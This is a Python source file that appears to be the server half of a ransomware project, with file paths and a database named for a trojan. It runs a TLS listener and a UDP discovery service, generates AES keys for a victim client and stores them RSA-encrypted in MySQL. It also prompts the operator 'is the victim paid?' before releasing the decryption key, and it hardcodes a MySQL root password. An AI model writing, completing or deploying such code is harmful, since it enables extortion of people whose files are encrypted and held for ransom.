import socket
import ssl
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
import base64
from random_word import RandomWords
import threading
import protocol

class SecureSocketServer:
    def __init__(self, cert, key):
        self.cert = cert
        self.key = key
        
        self.host = "0.0.0.0"
        self.port = 55555
        
        self.context = self._build_ssl_context()

    def listen_to_brodcast_requests(self):
        BRODCAST_PORT = 44444
        brodcast_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        brodcast_sock.bind(("0.0.0.0", BRODCAST_PORT))
        print("Broadcast server started on port", BRODCAST_PORT)
        
        while True:
            msg, addr = brodcast_sock.recvfrom(1024)
            if msg.decode() == "DISCOVER_SERVER":
                print("Discovery from", addr)
                brodcast_sock.sendto(b"SERVER_HERE", addr)


    def _build_ssl_context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=self.cert, keyfile=self.key)
        return ctx

    def accept_client(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((self.host, self.port))
            sock.listen(1)
            with self.context.wrap_socket(sock, server_side=True) as ssock:
                conn, addr = ssock.accept()
                print(f"[+] Connected from {addr}")
                return conn
            
            
class AesKeyManager:
    def generate_aes_key_from_secret_word(self, word):
        hasher = SHA256.new()
        hasher.update(word.encode())
        return hasher.digest()

    def encrypt_aes_key_with_rsa(self, aes_key, public_key_path="server_RSA_public.pem"):
        with open(public_key_path, "rb") as f:
            pub = RSA.import_key(f.read())
        cipher = PKCS1_OAEP.new(pub)
        return base64.b64encode(cipher.encrypt(aes_key)).decode()

    def decrypt_aes_key_with_rsa(self, enc_b64, private_key_path="server_RSA_private.pem"):
        with open(private_key_path, "rb") as f:
            priv = RSA.import_key(f.read())
        cipher = PKCS1_OAEP.new(priv)
        return cipher.decrypt(base64.b64decode(enc_b64))

    def get_random_word(self):
        return RandomWords().get_random_word()
    
    
class SQLDatabaseManager:
    def __init__(self, db_name="my_server_trojan"):
        self.config = {
            "host": "localhost",
            "user": "root",
            "password": "Galking22!!!",
            "database": db_name
        }

    def save_aes_key_in_database(self, key_b64):
        conn = mysql.connector.connect(**self.config)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (key_b64,))
        conn.commit()
        cursor.close()
        conn.close()

    def get_last_aes_key_from_database(self):
        conn = mysql.connector.connect(**self.config)
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_key FROM encrypted_keys ORDER BY id DESC LIMIT 1")
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        return result[0] if result else None
    
    
class TrojanServer:
    def __init__(self, action, conn):
        self.action = action
        self.conn = conn
        self.db = SQLDatabaseManager()
        self.keys = AesKeyManager()

    def handle_client(self):
        # option 1:
        
        # if self.action == "encrypt":
        #     aes_key = self.generate_and_store_aes_key()
        # else:
        #     aes_key = self.retrieve_aes_key()

        # protocol.send(self.conn, aes_key)
        # protocol.send(self.conn, self.action)

        # data = protocol.receive(self.conn)
        # decoded_data = data.decode()

        # print(decoded_data)
        
        
        
        
        # option 2:
        
        aes_key = self.generate_and_store_aes_key()
        protocol.send(self.conn, aes_key)
        
        data = protocol.receive(self.conn)
        decoded_data = data.decode()
        print(decoded_data)
        
        paid = False
        while(not paid):
            has_paid = input("is the victim paid? [yes/no]")
            if has_paid == "yes":
                paid = True
        
        msg = "sending decryption key"
        protocol.send(self.conn, msg)
        
        aes_key = self.retrieve_aes_key()
        protocol.send(self.conn, aes_key)
        
        protocol.receive(self.conn)





    def generate_and_store_aes_key(self):
        word = self.keys.get_random_word()
        aes_key = self.keys.generate_aes_key_from_secret_word(word)
        encrypted = self.keys.encrypt_aes_key_with_rsa(aes_key)
        self.db.save_aes_key_in_database(encrypted)
        return aes_key

    def retrieve_aes_key(self):
        encrypted_key = self.db.get_last_aes_key_from_database()
        aes_key = self.keys.decrypt_aes_key_with_rsa(encrypted_key)
        return aes_key
    
    
if __name__ == "__main__":
    HOST = "0.0.0.0"
    PORT = 44444
    CERT = "D:\python_programmers_clab\TROJAN_RANSOMEWARE/cert.pem"
    KEY = "D:\python_programmers_clab\TROJAN_RANSOMEWARE/key.pem"
    
    action = "decrypt"  # enter "encrypt" or "decrypt" manually

    server = SecureSocketServer(CERT, KEY)

    threading.Thread(target=server.listen_to_brodcast_requests, daemon=True).start()
    
    conn = server.accept_client()
    
    with conn:
        TrojanServer(action, conn).handle_client()